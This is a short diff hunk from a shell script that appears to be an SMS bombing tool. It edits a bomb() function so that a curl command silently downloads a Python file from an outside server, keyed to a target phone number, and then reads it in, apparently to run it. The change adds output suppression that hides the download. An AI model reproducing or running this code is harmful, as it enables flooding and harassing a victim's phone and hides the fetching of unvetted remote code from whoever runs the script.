@@ -48,7 +48,7 @@ bomb(){
 clear 
 banner 
 echo -e "\e[95m Settting Up Server"
-curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num" 
+curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num"  >/dev/null 2>&1
 if [ -f "keshav.py" ];
 then
 action=$(cat keshav.py)
